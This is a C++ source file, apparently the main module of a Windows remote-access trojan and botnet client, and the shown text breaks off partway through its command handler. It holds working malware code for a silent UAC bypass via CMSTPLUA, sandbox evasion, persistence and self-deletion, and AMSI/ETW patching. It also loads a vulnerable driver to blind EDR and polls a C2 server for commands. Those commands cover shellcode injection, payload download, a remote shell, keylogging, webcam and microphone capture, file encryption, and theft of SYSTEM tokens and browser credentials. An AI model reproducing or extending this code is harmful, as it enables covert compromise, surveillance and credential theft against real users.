/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
#pragma warning(disable: 4996)
#include "common.h"
#include "Manager.h"
#include "C2Client.h"
#include "Telemetry.h"

#include "ProcessManager.h"
#include "FileManager.h"
#include "ServiceManager.h"
#include "ScreenTool.h"
#include "Information.h"
#include "BotNet.h"
#include "Protector.h"
#include "FileCryptor.h"
#include "Keylogger.h"
#include "WebcamTool.h"
#include "MicTool.h"
#include "Evasion.h"
#include "TokenStealer.h"
#include "CredDump.h"
#include "ClipMon.h"
#include "DocOps.h"
#include "LsassDump.h"
#include "PrivEsc.h"
#include "AntiForensics.h"
#include "Hollow.h"
#include "NetScan.h"
#include "WMIPersist.h"
#include "RansomSim.h"
#include "BrowserHistory.h"
#include "RevShell.h"
#include "PPIDSpoof.h"
#include "DefenseKill.h"
#include "SleepObfusc.h"
#include "DirectSyscall.h"
#include "IndirectSyscall.h"
#include "StackSpoof.h"
#include "HeapEncrypt.h"
#include "PEStamp.h"
#include "ModuleStomp.h"
#include "APCInject.h"
#include "ThreadHijack.h"
#include "Doppelgang.h"
#include "AntiAnalysis.h"
#include "COMHijack.h"
#include "IFEOHijack.h"
#include "DLLHijack.h"
#include "LSASecrets.h"
#include "DCSync.h"
#include "BYOVD.h"
#include "KernelUnhook.h"
#include "ETWTiBlind.h"

// Returns true if this process token is elevated (admin)
static bool IsElevated() {
	BOOL elevated = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION te = {};
		DWORD sz = sizeof(te);
		if (GetTokenInformation(hToken, TokenElevation, &te, sz, &sz))
			elevated = te.TokenIsElevated;
		CloseHandle(hToken);
	}
	return elevated != FALSE;
}

// ── ICMLuaUtil COM interface (undocumented, stable since Vista) ───────────────
// Used internally by Windows' IColorCpl and several Control Panel applets.
// The CMSTPLUA server is a trusted auto-elevate binary so the OS grants it
// admin without a UAC prompt — we just call its ShellExec method.
// Detection: CoCreateInstance(CLSID_CMSTPLUA, CLSCTX_LOCAL_SERVER) from a
// non-installer process, logged by advanced EDR COM interception hooks.
// MITRE T1548.002 — same technique used by UACME bypass #33/#41.

static const CLSID CLSID_CMSTPLUA_ =
	{0x3E5FC7F9,0x9A51,0x4367,{0x90,0x63,0xA1,0x20,0x24,0x4F,0xBE,0xC7}};
static const IID   IID_ICMLuaUtil_ =
	{0x6EDD6D74,0xC007,0x4E75,{0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C}};

struct ICMLuaUtil : public IUnknown {
	virtual HRESULT STDMETHODCALLTYPE SetRasCredentials()      = 0;
	virtual HRESULT STDMETHODCALLTYPE SetRasEntryProperties()  = 0;
	virtual HRESULT STDMETHODCALLTYPE DeleteRasEntry()         = 0;
	virtual HRESULT STDMETHODCALLTYPE LaunchInfSection(
		PCWSTR pszSection, PCWSTR pszPath, PCWSTR pszTitle, BOOL bEula) = 0;
	virtual HRESULT STDMETHODCALLTYPE LaunchInfSectionEx(
		PCWSTR pszSection, PCWSTR pszPath, PCWSTR pszTitle, DWORD dwFlags) = 0;
	virtual HRESULT STDMETHODCALLTYPE CreateLayerDirectory(PCWSTR lpLayer) = 0;
	virtual HRESULT STDMETHODCALLTYPE ShellExec(
		LPCWSTR lpFile, LPCWSTR lpParams, LPCWSTR lpDir,
		ULONG fMask, ULONG nShow) = 0;
};

static bool ElevateCmstplua(const char* me, const char* args) {
	// MTA is required for out-of-process COM without a message pump.
	// STA (APARTMENTTHREADED) can deadlock waiting for a window message that never comes.
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	bool ownCom = (hr == S_OK);

	// Permissive security — lets the elevated server impersonate this process
	CoInitializeSecurity(NULL, -1, NULL, NULL,
	    RPC_C_AUTHN_LEVEL_DEFAULT,
	    RPC_C_IMP_LEVEL_IMPERSONATE,
	    NULL, EOAC_NONE, NULL);

	IUnknown* pUnk = nullptr;
	hr = CoCreateInstance(CLSID_CMSTPLUA_, NULL, CLSCTX_LOCAL_SERVER,
	                      IID_IUnknown, (void**)&pUnk);
	if (FAILED(hr)) { if (ownCom) CoUninitialize(); return false; }

	ICMLuaUtil* pLua = nullptr;
	hr = pUnk->QueryInterface(IID_ICMLuaUtil_, (void**)&pLua);
	pUnk->Release();
	if (FAILED(hr)) { if (ownCom) CoUninitialize(); return false; }

	auto ToW = [](const char* s) -> std::wstring {
		if (!s || !*s) return {};
		int n = MultiByteToWideChar(CP_ACP, 0, s, -1, NULL, 0);
		std::wstring w(n, 0);
		MultiByteToWideChar(CP_ACP, 0, s, -1, &w[0], n);
		return w;
	};
	std::wstring wMe   = ToW(me);
	std::wstring wArgs = ToW(args);

	hr = pLua->ShellExec(wMe.c_str(),
	                     wArgs.empty() ? NULL : wArgs.c_str(),
	                     NULL, 0, SW_HIDE);
	pLua->Release();
	if (ownCom) CoUninitialize();
	return SUCCEEDED(hr);
}

// ── Mark of the Web self-relocation ──────────────────────────────────────────
// Files downloaded via a browser have a Zone.Identifier ADS (Zone 3 = Internet).
// Windows blocks CLSCTX_LOCAL_SERVER COM activation from Zone 3 processes,
// so CMSTPLUA silently fails. Copying to %APPDATA% removes the ADS restriction.

// Drop-in replacement for ShellExecuteA("open",...) that uses CreateProcessA directly.
// Benefits: bypasses ShellExecuteA EDR hooks; gives us full control over startup flags.
static bool SpawnHidden(const char* exe, const char* args) {
    std::string cmdLine = "\"" + std::string(exe) + "\"";
    if (args && args[0]) { cmdLine += " "; cmdLine += args; }
    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessA(exe, (LPSTR)cmdLine.c_str(),
                             NULL, NULL, FALSE,
                             CREATE_NO_WINDOW | DETACHED_PROCESS,
                             NULL, NULL, &si, &pi);
    if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    return ok != FALSE;
}

static bool SelfRelocate(const char* me) {
	std::string zoneCheck = std::string(me) + S(":Zone.Identifier");
	HANDLE hZ = CreateFileA(zoneCheck.c_str(), GENERIC_READ, FILE_SHARE_READ,
	                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hZ == INVALID_HANDLE_VALUE) return false;
	CloseHandle(hZ);

	char appdata[MAX_PATH] = {};
	GetEnvironmentVariableA(S("APPDATA").c_str(), appdata, sizeof(appdata));
	const char* slash = strrchr(me, '\\');
	const char* fname = slash ? slash + 1 : me;
	std::string dest = std::string(appdata) + S("\\Microsoft\\Windows\\") + fname;
	if (!CopyFileA(me, dest.c_str(), FALSE)) return false;

	SpawnHidden(dest.c_str(), NULL);
	return true;
}

// ── Master silent elevation ───────────────────────────────────────────────────
// CMSTPLUA COM: no registry writes, no visible side effects, works at all
// non-AlwaysNotify UAC levels. Requires running from a path without Mark of the Web
// (SelfRelocate handles that before this is called).
// Fallback: standard UAC dialog via runas.

static void SilentAutoElevate(const char* me, const char* args) {
	if (ElevateCmstplua(me, args)) return;
	SHELLEXECUTEINFOA sei = {};
	sei.cbSize       = sizeof(sei);
	sei.lpVerb       = S("runas").c_str();
	sei.lpFile       = me;
	sei.lpParameters = (args && *args) ? args : NULL;
	sei.nShow        = SW_HIDE;
	ShellExecuteExA(&sei);
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
	if (!IsElevated()) {
		char me[MAX_PATH] = {};
		GetModuleFileNameA(NULL, me, MAX_PATH - 1);
		if (SelfRelocate(me)) return 0;
		SilentAutoElevate(me, lpCmdLine);
		return 0;
	}

	srand((unsigned int)time(NULL));

	// Build syscall SSN table before any Nt* calls — runs once, ~1ms.
	// After this, DirectSyscall::Exec(ssn, ...) bypasses all user-mode hooks.
	DirectSyscall::Init();

	Manager::Settings s;
	Manager::ReadData(&s);

	// Outlast sandbox analysis window before touching any persistence APIs.
	Protector::StartupDelay();

	// ── Sandbox / VM / Debugger gate ─────────────────────────────────────────────
	// Quit silently before touching persistence if we're in an analysis environment.
	// Multiple signals required to avoid false positives on unusual-but-real hardware.
	{
		int sbFlags = 0;

		// Debugger attached (PEB.BeingDebugged)
		if (IsDebuggerPresent()) sbFlags += 3;

		// Hypervisor bit — VMware, VBox, Hyper-V, KVM all set ECX[31] on CPUID leaf 1
		int cpuInfo[4] = {};
		__cpuid(cpuInfo, 1);
		if ((cpuInfo[2] >> 31) & 1) sbFlags++;

		// Known hypervisor vendor string (leaf 0x40000000)
		__cpuid(cpuInfo, 0x40000000);
		char hvVendor[13] = {};
		memcpy(hvVendor + 0, &cpuInfo[1], 4);
		memcpy(hvVendor + 4, &cpuInfo[2], 4);
		memcpy(hvVendor + 8, &cpuInfo[3], 4);
		if (strstr(hvVendor, S("VMware").c_str()) || strstr(hvVendor, S("KVMKVM").c_str()) ||
		    strstr(hvVendor, S("Microsoft Hv").c_str()) || strstr(hvVendor, S("VBoxVBox").c_str()))
			sbFlags++;

		// Single logical processor (most sandboxes use 1 core)
		SYSTEM_INFO _si = {}; GetSystemInfo(&_si);
		if (_si.dwNumberOfProcessors < 2) sbFlags++;

		// Physical RAM < 2 GB
		MEMORYSTATUSEX ms = { sizeof(ms) };
		GlobalMemoryStatusEx(&ms);
		if (ms.ullTotalPhys < (DWORDLONG)2 * 1024 * 1024 * 1024) sbFlags++;

		// Uptime < 5 minutes (sandbox resets between samples)
		if (GetTickCount() < 300000) sbFlags++;

		if (sbFlags >= 2) ExitProcess(0);
	}

	char me[128] = { 0 };
	GetModuleFileNameA(0, me, sizeof(me) - 1);

	HKEY hKey = 0;
	std::string addrStr = S("Software\\Microsoft\\IdentityStore");
	const char* addr = addrStr.c_str();
	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, addr, 0, KEY_READ, &hKey);

	if (result != ERROR_SUCCESS) {
		RegCreateKeyA(HKEY_CURRENT_USER, addr, &hKey);

		if (s.autorun_state) {
			if (s.drop_run) {
				Manager::Autorun(s.drop, s.autorun);
			}
			else {
				Manager::Autorun(me, s.autorun);
			}
		}

		if (s.scheduler_state) {
			if (s.drop_run) {
				Manager::Scheduler(s.drop, s.scheduler_name);
			}
			else {
				Manager::Scheduler(me, s.scheduler_name);
			}
		}

		if (s.drop_run) {
			if (std::string(me) != s.drop) {
				CopyFileA(me, s.drop, false);
				SpawnHidden(s.drop, NULL);

				if (s.auto_delete) {
					// Delete self via cmd.exe subprocess — no bat file written to disk.
					char _wd[MAX_PATH] = {};
					GetWindowsDirectoryA(_wd, sizeof(_wd) - 1);
					std::string _cmd = std::string(_wd) + S("\\System32\\cmd.exe");
					std::string _args = S("/c timeout /t 2 /nobreak > nul & del /f /q \"") + me + "\"";
					SpawnHidden(_cmd.c_str(), _args.c_str());
				}

				return 0;
			}
		}
		else {
			SpawnHidden(me, NULL);
		}

		RegCloseKey(hKey);
	}
	else {
		RegCloseKey(hKey);

		// lpCmdLine is args-only (no exe path), so spaces in the install path don't cause false splits
		std::vector<std::string> spLine;
		if (lpCmdLine && lpCmdLine[0])
			spLine = Manager::split(lpCmdLine, ' ');

		if (spLine.size() >= 2) {
			// Protector watcher mode: arg0=procName, arg1=procPath
			Protector::_SpyProcess SP;
			SP.procName = (char*)spLine[0].c_str();
			SP.procPath = (char*)spLine[1].c_str();

			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector::SpyProcess, (LPVOID)&SP, 0, 0);
			while (true) {
				Sleep(1000);
			}
		}
		else {
			bool isProtected = (!spLine.empty() && spLine[0] == "protected");
			if (!isProtected) {
				char procName[128], procPath[128];

				GetModuleBaseNameA(GetCurrentProcess(), 0, procName, sizeof(procName));
				GetModuleFileNameA(0, procPath, sizeof(procPath));
				strcat(procName, ".exe");

				CopyFileA(procPath, s.protectorName, FALSE);

				std::string arg = std::string(procName) + " " + procPath;
				SpawnHidden(s.protectorName, arg.c_str());
			}

			if (s.botapi[0] == '\0') {
				ExitProcess(0);
			}

			// Persist bot ID in registry so restarts don't create duplicate bots
			int ID = 0;
			HKEY hIdKey = 0;
			if (RegOpenKeyExA(HKEY_CURRENT_USER, addr, 0, KEY_READ | KEY_WRITE, &hIdKey) == ERROR_SUCCESS) {
				DWORD sz = sizeof(ID);
				std::string botIdKey = S("BotID");
				if (RegQueryValueExA(hIdKey, botIdKey.c_str(), 0, NULL, (LPBYTE)&ID, &sz) != ERROR_SUCCESS || ID == 0) {
					ID = rand();
					RegSetValueExA(hIdKey, botIdKey.c_str(), 0, REG_DWORD, (LPBYTE)&ID, sizeof(ID));
				}
				RegCloseKey(hIdKey);
			} else {
				ID = rand();
			}
			// s.botapi = C2 server hostname, s.chatid = auth key
			C2Client api(s.botapi, s.chatid, ID);
			BotNet botnet;

			SYSTEM_INFO SysInfo;
			GetSystemInfo(&SysInfo);

			// Anti-process monitor is always unconditional — no config gate.
			// There is no legitimate reason to deploy without it.
			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector::AntiProcesses, 0, 0, 0);

			// Auto-evasion: patch AMSI + blind ETW + unhook ntdll before first checkin.
			// Runs silently; EDR hooks and AMSI scanning are blind to everything after this.
			Evasion::RunAll();

			// Stomp the PE header in memory so memory scanners can't find the MZ/PE magic bytes.
			// Must run after evasion (AMSI blind) so this action isn't logged.
			PEStamp::StompFull();

			std::string information = "Bot ID: " + std::to_string(ID) +
				"%0A%0AGlobal information:" +
				"%0AName: " + Information::GetPCName() +
				"%0AIP: " + Information::GetIP() +
				"%0AOS: " + Information::GetOS() +
				"%0A%0AHardware information:" +
				"%0AOEM ID: " + std::to_string(SysInfo.dwOemId) +
				"%0AProcessors: " + std::to_string(SysInfo.dwNumberOfProcessors) +
				"%0AProcessor: " + Information::GetProcessorBrand();

			api.Checkin(information.c_str());

			// ── Auto-BYOVD kernel hardening ─────────────────────────────────────
			// If elevated AND the driver exists alongside the EXE, silently run the
			// full kernel protection sequence: load driver → blind ETWTI → remove
			// EDR process-creation callbacks. Operator no longer needs to send 3 manual
			// commands — kernel evasion activates automatically on first checkin.
			// If the driver is blocklisted (Win11 22H2+), reports to C2 and continues.
			if (IsElevated()) {
				char exeDir[MAX_PATH] = {};
				GetModuleFileNameA(NULL, exeDir, MAX_PATH - 1);
				char* sep = strrchr(exeDir, '\\');
				if (sep) { sep[1] = '\0'; }
				std::string driverPath = std::string(exeDir) + S("RTCore64.sys");

				if (GetFileAttributesA(driverPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
					SC_HANDLE hSvc = BYOVD::LoadDriver(driverPath.c_str());
					if (hSvc) {
						HANDLE hDev = BYOVD::OpenDevice();
						if (hDev && hDev != INVALID_HANDLE_VALUE) {
							ETWTiBlind::Blind(hDev);
							KernelUnhook::RemoveProcessCallbacks(hDev);
							CloseHandle(hDev);
							api.SendEvent(S("byovd:auto:ok").c_str());
						}
					} else {
						// Driver blocked by WDAC/blocklist — report and continue without kernel evasion.
						api.SendEvent(S("byovd:auto:blocked").c_str());
					}
				}
			}

			Telemetry::Start(&api, ID);

			std::string last;
			std::vector<std::string> params;

			while (true) {
				DWORD pollMs = (DWORD)atoi(s.client_delay);
				// ±25% jitter: defeats beacon-interval NDR/network detection rules.
				// A perfectly periodic beacon is a textbook C2 signature in Zeek, Suricata, etc.
				DWORD jitter = pollMs / 4;
				DWORD sleepMs = pollMs - jitter + (DWORD)(rand() % (jitter * 2 + 1));
				// Dual-layer sleep: encrypt heap + encrypt .text simultaneously while idle.
				// Heap encryption hides C2 config strings, credential buffers, etc.
				// .text encryption hides code signatures in the code section.
				// Both layers active together: memory scanner finds no readable strings OR code.
				HeapEncrypt::CombinedObfSleep(sleepMs, 0);

				last = api.GetPendingCommand();

				if (last.empty()) {
					continue;
				}

				params = Manager::split(last, ' ');

				// PROCESS MANAGER
				if (last == "processes") {
					std::string processes = ProcessManager::ProcessList();
					api.SendResult(processes.empty() ? "Error! Processes is empty" : processes.c_str());
				}

				// closeproc process.exe
				else if (params[0] == "closeproc") {
					api.SendResult(ProcessManager::CloseProcess(params[1])
						? "Success! Process has been closed"
						: "Error! Process isn't closed");
				}

				// inject_dll process.exe C:\path\to.dll
				else if (params[0] == "inject_dll") {
					api.SendResult(ProcessManager::InjectDLL(params[1].c_str(), params[2].c_str())
						? "Success! DLL has been injected"
						: "Error! DLL isn't injected");
				}

				// inject_shell process.exe <shellcode>
				else if (params[0] == "inject_shell") {
					DWORD pid = ProcessManager::PIDByName(params[1]);
					if (pid != 0) {
						api.SendResult(ProcessManager::InjectShell(pid, params[2])
							? "Success! Shellcode is injected"
							: "Error! Shellcode isn't injected");
					}
					else {
						api.SendResult("Error! Process not found");
					}
				}

				// AUXILIARY
				// loader https://example.com/file.exe C:\dest\file.exe
				else if (params[0] == "loader") {
					// Dynamically load URLDownloadToFileA so urlmon.dll stays out of the import table
					using fn_UDTF = HRESULT(WINAPI*)(LPUNKNOWN,LPCSTR,LPCSTR,DWORD,LPVOID);
					static HMODULE hUrlmon = LoadLibraryA(S("urlmon.dll").c_str());
					static fn_UDTF pUDTF = hUrlmon
						? (fn_UDTF)GetProcAddress(hUrlmon, S("URLDownloadToFileA").c_str())
						: nullptr;
					if (pUDTF) pUDTF(0, params[1].c_str(), params[2].c_str(), 0, 0);
					if (Manager::FileExists(params[2])) {
						std::string text = "Success! File is uploaded to: " + params[2];
						api.SendResult(text.c_str());
					}
					else {
						api.SendResult("Error! File not uploaded!");
					}
				}

				// run C:\File.exe [args]
				else if (params[0] == "run") {
					if (params.size() >= 3) {
						SpawnHidden(params[1].c_str(), params[2].c_str());
						api.SendResult("Success! Ran with arguments");
					}
					else {
						SpawnHidden(params[1].c_str(), NULL);
						api.SendResult("Success! Ran without arguments");
					}
				}

				// SYSTEM CONTROL
				else if (last == "disable pc") {
					// Adjust shutdown privilege then call ExitWindowsEx — no cmd.exe subprocess
					HANDLE hTok = NULL;
					if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) {
						TOKEN_PRIVILEGES tp = {};
						tp.PrivilegeCount = 1;
						std::string priv = S("SeShutdownPrivilege");
						LookupPrivilegeValueA(NULL, priv.c_str(), &tp.Privileges[0].Luid);
						tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
						AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
						CloseHandle(hTok);
					}
					ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0);
				}

				else if (last == "close") {
					ExitProcess(0);
				}

				else if (last == "disable display") {
					SendMessage(NULL, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
				}

				// FILE MANAGER
				// dir del_file C:\path\to\file.exe
				// dir show C:\Folder
				// dir read C:\path\to\file.txt
				// dir write C:\path\to\file.txt text...
				else if (params[0] == "dir") {
					if (params[1] == "del_file") {
						api.SendResult(DeleteFileA(params[2].c_str())
							? "Success! File deleted"
							: "Error! File was not deleted");
					}
					else if (params[1] == "show") {
						std::string objects = FileManager::DirectoryObjectsList(params[2]);
						api.SendResult(objects.empty() ? "Error! Files not found!" : objects.c_str());
					}
					else if (params[1] == "read") {
						std::string text = FileManager::ReadFile(params[2]);
						api.SendResult(text.empty() ? "Error! File was not read" : text.c_str());
					}
					else if (params[1] == "write") {
						std::string write_text = last;
						write_text.replace(0, last.find(params[2]) + params[2].length() + 1, "");
						api.SendResult(FileManager::WriteFile(params[2], write_text)
							? "Success! Text is written"
							: "Error! Text was not written");
					}
				}

				// PULL FILE  —  pull C:\path\to\file
				else if (params[0] == "pull") {
					std::string filePath = last.substr(5); // strip "pull "
					std::string saved = api.UploadFile(filePath.c_str());
					api.SendResult(saved.empty() ? "Error! File upload failed" : ("Uploaded: " + saved).c_str());
				}

				// SERVICE MANAGER
				else if (params[0] == "service") {
					if (params[1] == "show") {
						std::string services = ServiceManager::ServiceList();
						api.SendResult(services.empty() ? "Error! Services is empty" : services.c_str());
					}
					else if (params[1] == "add") {
						DWORD Type      = ServiceManager::ParseTypeDriver(params[5]);
						DWORD StartType = ServiceManager::ParseStartTypeDriver(params[6]);
						if (Type == 0 || StartType == 0) {
							api.SendResult("Error! Invalid service type or start type");
						}
						else {
							api.SendResult(ServiceManager::AddSvc(params[2], params[3], params[4], Type, StartType)
								? "Success! Service has been added"
								: "Error! Service not added");
						}
					}
					else if (params[1] == "delete") {
						api.SendResult(ServiceManager::DeleteSvc(params[2])
							? "Success! Service has been deleted"
							: "Error! Service not deleted");
					}
					else if (params[1] == "start") {
						api.SendResult(ServiceManager::StartSvc(params[2])
							? "Success! Service has been started"
							: "Error! Service not started");
					}
					else if (params[1] == "stop") {
						api.SendResult(ServiceManager::StopSvc(params[2])
							? "Success! Service has been stopped"
							: "Error! Service not stopped");
					}
				}

				// SYSTEM SHELL
				// system ping google.com
				else if (params[0] == "system") {
					try {
						std::string cmd = last;
						cmd.replace(cmd.find("system "), 7, "");
						char windir[128] = { 0 };
						if (GetWindowsDirectoryA(windir, sizeof(windir) - 1) != 0) {
							std::string cmdExe = std::string(windir) + S("\\System32\\cmd.exe");
							SpawnHidden(cmdExe.c_str(), (S("/c ") + cmd).c_str());
							api.SendResult("Success! Command is running");
						}
						else {
							api.SendResult("Error! Windows directory is null");
						}
					}
					catch (std::exception) {
						api.SendResult("Error! Recheck the parameters");
					}
				}

				// SCREENSHOT
				else if (params[0] == "screenshot") {
					std::string filename = std::to_string(rand()) + ".jpeg";
					if (ScreenTool::GDIScreen(filename)) {
						std::string saved = api.UploadFile(filename.c_str());
						DeleteFileA(filename.c_str());
						if (!saved.empty()) {
							std::string msg = "Screenshot saved on C2: " + saved;
							api.SendResult(msg.c_str());
						} else {
							api.SendResult("Error! Screenshot upload failed");
						}
					}
					else {
						api.SendResult("Error! Screenshot was not created");
					}
				}

				// FILE CRYPTOR
				// filecrypt C:\path\to\file.txt <key>
				else if (params[0] == "filecrypt") {
					api.SendResult(FileCryptor::FileCrypt(params[1], params[2])
						? "Success! File crypted"
						: "Error! File not crypted. Maybe file not found?");
				}

				// filedecrypt C:\path\to\file.txt.b4db4b3 <key>
				else if (params[0] == "filedecrypt") {
					api.SendResult(FileCryptor::FileDecrypt(params[1], params[2])
						? "Success! File decrypted"
						: "Error! File not decrypted");
				}

				// WEBCAM
				// webcam capture
				else if (params[0] == "webcam") {
					if (params.size() >= 2 && params[1] == "capture") {
						std::string fname = std::to_string(rand()) + "_webcam.jpeg";
						if (WebcamTool::CaptureFrame(fname)) {
							std::string saved = api.UploadFile(fname.c_str());
							DeleteFileA(fname.c_str());
							api.SendResult(saved.empty()
								? "Error! Webcam capture failed to upload"
								: ("Webcam frame saved on C2: " + saved).c_str());
						} else {
							api.SendResult("Error! Webcam not available or capture failed");
						}
					} else {
						api.SendResult("Usage: webcam capture");
					}
				}

				// MICROPHONE
				// mic record <seconds>
				else if (params[0] == "mic") {
					if (params.size() >= 3 && params[1] == "record") {
						int secs = atoi(params[2].c_str());
						if (secs < 1 || secs > 60) secs = 10;
						std::string fname = std::to_string(rand()) + "_mic.wav";
						if (MicTool::Record(fname, secs)) {
							std::string saved = api.UploadFile(fname.c_str());
							DeleteFileA(fname.c_str());
							api.SendResult(saved.empty()
								? "Error! Mic recording failed to upload"
								: ("Mic recording saved on C2: " + saved).c_str());
						} else {
							api.SendResult("Error! Microphone not available or recording failed");
						}
					} else {
						api.SendResult("Usage: mic record <seconds>  (1-60)");
					}
				}

				// KEYLOGGER
				// keylog start
				// keylog stop
				// keylog dump
				// keylog status
				else if (params[0] == "keylog") {
					if (params.size() >= 2) {
						if (params[1] == "start") {
							Keylogger::Start();
							api.SendResult("Keylogger started");
						}
						else if (params[1] == "stop") {
							Keylogger::Stop();
							api.SendResult("Keylogger stopped");
						}
						else if (params[1] == "dump") {
							std::string data = Keylogger::Dump();
							api.SendResult(data.empty() ? "Buffer empty" : data.c_str());
						}
						else if (params[1] == "status") {
							api.SendResult(Keylogger::IsRunning() ? "Keylogger: RUNNING" : "Keylogger: STOPPED");
						}
						else {
							api.SendResult("Usage: keylog start|stop|dump|status");
						}
					}
					else {
						api.SendResult(Keylogger::IsRunning() ? "Keylogger: RUNNING" : "Keylogger: STOPPED");
					}
				}

				// ── EVASION ───────────────────────────────────────────────────────────
				// evasion amsi      — patch AmsiScanBuffer in amsi.dll
				// evasion etw       — blind EtwEventWrite in ntdll.dll
				// evasion unhook    — restore ntdll .text from disk (remove AV hooks)
				// evasion hookcheck — report which Nt* functions are hooked by EDR
				// evasion obfsleep <ms> — test one obfuscated sleep cycle (encrypts .text)
				// evasion all       — run amsi + etw + unhook
				else if (params[0] == "evasion") {
					std::string sub = (params.size() >= 2) ? params[1] : "all";
					if (sub == "amsi") {
						api.SendResult(Evasion::PatchAmsi()
							? "AMSI: patched (AmsiScanBuffer now returns E_INVALIDARG)"
							: "AMSI: patch failed");
					} else if (sub == "etw") {
						api.SendResult(Evasion::PatchEtw()
							? "ETW: blinded (EtwEventWrite patched with ret)"
							: "ETW: patch failed");
					} else if (sub == "unhook") {
						api.SendResult(Evasion::UnhookNtdll()
							? "Unhook: ntdll .text restored from disk"
							: "Unhook: failed");
					} else if (sub == "hookcheck") {
						// Scan ntdll stubs and report which Nt* functions are hooked.
						// Tells you exactly what the installed EDR is monitoring.
						api.SendResult(DirectSyscall::HookReport().c_str());
					} else if (sub == "obfsleep") {
						// Test one encrypted-sleep cycle.
						// During the sleep window, scan the process with a memory scanner —
						// the .text section should appear as encrypted garbage, no signatures.
						DWORD ms = (params.size() >= 3) ? (DWORD)atoi(params[2].c_str()) : 5000;
						api.SendResult(("ObfuscatedSleep: encrypting .text and sleeping " +
							std::to_string(ms) + " ms...\n"
							"Scan this process NOW with a memory scanner.\n"
							"After wake: .text decrypted, permissions restored.").c_str());
						SleepObfusc::ObfuscatedSleep(ms, 0);
						api.SendResult("ObfuscatedSleep: done — .text is decrypted and RX again.");
					} else {
						std::string r = Evasion::RunAll();
						api.SendResult(r.c_str());
					}
				}

				// ── TOKEN STEALER ─────────────────────────────────────────────────────
				// tokensteal                   — impersonate NT AUTHORITY\SYSTEM on this thread
				// tokenshell C:\...\cmd.exe    — spawn process under stolen SYSTEM token
				// tokenrevert                  — revert to original thread token
				else if (params[0] == "tokensteal") {
					std::string r = TokenStealer::StealSystem();
					api.SendResult(r.c_str());
				}

				else if (params[0] == "tokenshell" && params.size() >= 2) {
					DWORD pid = TokenStealer::SpawnAsSystem(params[1]);
					api.SendResult(pid
						? ("SYSTEM process spawned PID=" + std::to_string(pid)).c_str()
						: "tokenshell: SpawnAsSystem failed");
				}

				else if (params[0] == "tokenrevert") {
					TokenStealer::Revert();
					api.SendResult("Thread token reverted");
				}

				// ── CREDENTIAL DUMP ───────────────────────────────────────────────────
				// creddump credman    — Windows Credential Manager
				// creddump chrome     — Chrome / Edge saved passwords (DPAPI + AES-GCM)
				// creddump cookies    — Chrome session cookies for Google account access
				// creddump cookiesdb  — upload raw Cookies SQLite to C2 for offline decrypt
				else if (params[0] == "creddump") {
					std::string sub = (params.size() >= 2) ? params[1] : "";
					if (sub == "credman") {
						std::string r = CredDump::CredMan();
						api.SendResult(r.c_str());
					} else if (sub == "chrome") {
						std::string r = CredDump::Chrome();
						api.SendResult(r.c_str());
					} else if (sub == "cookies") {
						std::string r = CredDump::ChromeCookies();
						api.SendResult(r.c_str());
					} else if (sub == "cookiesdb") {
						std::string dbPath = CredDump::ChromeCookiesDbPath();
						if (dbPath.empty()) {
							api.SendResult("cookiesdb: could not copy Cookies database");
						} else {
							std::string saved = api.UploadFile(dbPath.c_str());
							DeleteFileA(dbPath.c_str());
							api.SendResult(saved.empty()
								? "cookiesdb: upload failed"
								: ("cookiesdb: " + saved + "\nDecrypt offline: python3 decrypt_cookies.py --db <file> --key <master_key_hex>").c_str());
						}
					} else {
						api.SendResult("Usage: creddump credman|chrome|cookies|cookiesdb");
					}
				}

				// ── CLIPBOARD MONITOR ─────────────────────────────────────────────────
				// clipmon start   — start background clipboard monitor (auto-started on launch)
				// clipmon stop    — stop monitor
				// clipmon dump    — dump and clear accumulated clipboard entries
				// clipmon status
				else if (params[0] == "clipmon") {
					std::string sub = (params.size() >= 2) ? params[1] : "status";
					if (sub == "start") {
						ClipMon::Start();
						api.SendResult("Clipboard monitor started");
					} else if (sub == "stop") {
						ClipMon::Stop();
						api.SendResult("Clipboard monitor stopped");
					} else if (sub == "dump") {
						std::string data = ClipMon::Dump();
						api.SendResult(data.c_str());
					} else {
						api.SendResult(ClipMon::IsRunning()
							? "ClipMon: RUNNING"
							: "ClipMon: STOPPED");
					}
				}

				// ── DOCUMENT OPS ─────────────────────────────────────────────────────
				// xlread  <path> <sheet> <range>         — read cells via Excel COM
